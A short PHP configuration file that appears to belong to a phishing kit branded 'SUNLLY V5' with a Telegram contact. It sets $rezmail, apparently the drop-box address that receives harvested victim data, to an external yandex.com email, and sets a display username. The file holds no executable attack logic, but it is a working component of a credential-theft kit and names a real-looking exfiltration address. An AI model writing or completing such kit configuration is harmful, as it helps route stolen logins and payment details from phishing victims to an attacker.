<?php



$rezmail = "labeuhr@yandex.com"; // Email-Boite

$rezname = "🐍 jesus 🐍"; // UserName                                           SUNLLY V5 [@Sunllyzebi on Telegram]




?>

